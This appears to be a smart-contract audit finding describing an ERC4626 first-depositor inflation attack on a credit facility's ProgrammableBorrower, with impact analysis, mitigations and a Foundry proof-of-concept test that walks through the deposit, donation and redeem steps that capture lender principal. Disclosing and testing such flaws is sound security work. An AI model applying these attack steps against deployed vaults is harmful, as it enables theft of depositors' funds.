### Title
ERC4626 first-depositor inflation steals parked credit-vault principal and leaves tranches unbacked - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` deposits all idle lender funds into an operator-configured ERC4626 vault when `onStartEpoch` is called, but accepts whatever share amount the vault returns without a minimum-share or post-deposit value check. [1](#0-0) [2](#0-1)  An unprivileged user of that external vault can perform the standard first-depositor inflation attack before the epoch starts: mint one share, donate assets directly to the vault, and make the credit facility's subsequent deposit mint zero or near-zero shares. [3](#0-2)  The resulting vault loss is tracked by `ProgrammableBorrower`, but `IdleCDOEpochVariant` does not realize that loss in tranche accounting when `totalInterestDueNow` returns zero. [4](#0-3) [5](#0-4) 

### Finding Description
During `startEpoch`, the CDO transfers surplus underlying to the configured borrower address, which for revolving credit deployments is the `ProgrammableBorrower` proxy. [6](#0-5) [7](#0-6)  `ProgrammableBorrower.onStartEpoch` snapshots `startAssets` before depositing, then deposits the full on-hand balance into `vault` and marks epoch accounting active. [8](#0-7)  `_depositToVault` records `vault.deposit`'s returned shares but does not check that they are nonzero or that their `convertToAssets` value approximates the deposited amount. [2](#0-1) 

The attacker therefore needs only to be an ordinary depositor in the chosen ERC4626 vault. If the vault is empty before the first credit epoch, the attacker can deposit `1` wei, receive `1` share, donate `D` underlying directly to the vault, and inflate each share to approximately `D + 1` assets. When the facility deposits `A` assets, a floor-dividing ERC4626 mints approximately `A / (D + 1)` shares; choosing `D >= A` can mint zero shares, while a slightly smaller donation can mint one share worth nearly all contributed assets. The attacker then redeems its initial share and captures the donation plus the facility's deposit. No privileged role is required.

### Impact Explanation
This is direct theft of lender principal, bounded only by the amount parked into an empty or attacker-controlled-inflation ERC4626 vault. The credit vault still believes its strategy-token position is backed because deposits mint strategy tokens one-for-one and the external vault loss is not automatically burned from the CDO's tranche accounting. [9](#0-8) [10](#0-9)  Future withdrawals then lack real backing, causing either permanent losses or a later borrower-default path for assets that were actually stolen from the ERC4626 sleeve. [11](#0-10) 

The broken invariant is fair accounting between CDO strategy tokens and recoverable borrower-side assets. The skim only protects raw donations to the CDO itself; it does not prevent economically meaningful donation-based manipulation inside the external ERC4626 vault. [12](#0-11) 

### Likelihood Explanation
Likelihood depends on deployment and vault state, but the attack is especially strong for a newly configured revolving-credit facility whose ERC4626 vault is empty or nearly empty. A vault user can execute the inflation immediately after deployment and before the first `startEpoch`; no KYC status, borrower authority, manager authority, or contract-specific privilege is needed. [13](#0-12) [8](#0-7)  Existing guards do not stop it: `initialize` only validates that the vault asset matches the CDO token, and `setVault` only performs the same asset check when switching vaults. [14](#0-13) [15](#0-14) 

### Recommendation
Treat the configured ERC4626 vault as an adversarial accounting surface rather than a trusted evaluator. At minimum:

- require `shares > 0` and compare `vault.convertToAssets(shares)` to `_assetAmount` inside a bounded relative tolerance in `_depositToVault`;
- use `previewDeposit` or equivalent slippage-aware expectations where the vault supports it;
- seed the vault through a privileged initialization path or require a minimum initial share supply and virtual-share protection;
- propagate realized `vaultLoss` into CDO accounting rather than only flooring `totalInterestDueNow` at zero;
- reject vaults without inflation-resistant decimals/virtual shares or require an initial dead-share deposit.

### Proof of Concept
A Foundry PoC can reproduce the issue with a minimal floor-dividing ERC4626 vault:

```solidity
// test/foundry/ProgrammableBorrowerInflation.t.sol
function test_firstDepositorInflationStealsProgrammableBorrowerDeposit() external {
    // 1. Deploy underlying, an empty ERC4626-style vault, IdleCreditVault,
    //    IdleCDOEpochVariant, and ProgrammableBorrower using the normal factory path.
    // 2. Mint 100_000 USDC to attacker and 1_000_000 USDC to a KYC-passing LP.

    // Attacker inflates the empty ERC4626 share price.
    underlying.mint(attacker, 1_000_001e6);
    vm.startPrank(attacker);
    underlying.approve(address(externalVault), 1);
    externalVault.deposit(1, attacker);                 // 1 share
    underlying.transfer(address(externalVault), 1_000_000e6); // donation
    vm.stopPrank();

    // LP deposits into the CDO and the honest manager starts the epoch.
    underlying.mint(lender, 1_000_000e6);
    vm.startPrank(lender);
    underlying.approve(address(cdo), 1_000_000e6);
    cdo.depositAA(1_000_000e6);
    vm.stopPrank();

    vm.prank(manager);
    cdo.startEpoch(); // ProgrammableBorrower deposits idle assets into externalVault.

    uint256 shares = externalVault.balanceOf(address(programmableBorrower));
    assertEq(shares, 0, "inflated vault minted zero shares to facility");

    // The attacker redeems its single share and receives both its donation and
    // the facility's deposit.
    vm.prank(attacker);
    uint256 recovered = externalVault.redeem(1, attacker, attacker);
    assertGe(recovered, 1_999_999e6, "facility deposit captured");

    // ProgrammableBorrower recognizes a vault loss, while CDO accounting remains par.
    assertGt(programmableBorrower.vaultLoss(), 0);
    assertEq(strategy.balanceOf(address(cdo)), 1_000_000e6);

    // stopEpoch prices the epoch through totalInterestDueNow, which floors at zero
    // and does not burn the stolen principal from strategy-token accounting.
    vm.warp(cdo.epochEndDate() + 1);
    vm.prank(manager);
    cdo.stopEpoch(0, 0);

    assertFalse(cdo.defaulted());
    assertEq(programmableBorrower.totalUnderlying(), 0);
}
```

  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);

  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
